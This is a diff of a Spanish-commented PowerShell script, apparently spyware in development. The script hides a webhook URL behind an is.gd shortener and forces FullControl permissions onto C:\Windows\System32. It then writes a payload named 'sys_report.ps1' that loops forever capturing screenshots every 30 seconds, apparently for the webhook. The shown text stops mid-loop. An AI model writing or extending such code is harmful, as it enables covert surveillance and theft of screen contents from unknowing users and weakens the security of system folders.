@@ -5,16 +5,29 @@ $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de t
 $directoryName = "C:\Windows\System32\Scripts"
 $scriptName = "sys_report.ps1"
 
-# Crear el directorio si no existe
+# Crear el directorio si no existe y asignar permisos
 if (-not (Test-Path -Path $directoryName)) {
     New-Item -Path $directoryName -ItemType Directory | Out-Null
+    $ACL = Get-Acl -Path $directoryName
+    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
+    $ACL.AddAccessRule($AccessRule)
+    Set-Acl -Path $directoryName -AclObject $ACL
 }
+
+# Obtener la ruta completa de System32
+$system32Path = [Environment]::GetFolderPath([Environment+SpecialFolder]::System)
+
+# Forzar los permisos en la carpeta System32
+$system32ACL = Get-Acl -Path $system32Path
+$system32AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
+$system32ACL.SetAccessRule($system32AccessRule)
+Set-Acl -Path $system32Path -AclObject $system32ACL
 
 # Definir el contenido del script
 $scriptContent = @"
 `$hookurl = "$hookurl"
 `$seconds = 30 # Intervalo de captura de pantalla en segundos
-`$a = 1 # Contador de capturas de pantalla
+`$a = 0 # Contador de capturas de pantalla
 
 # Bucle infinito para tomar capturas de pantalla continuamente
 while (`$true) {
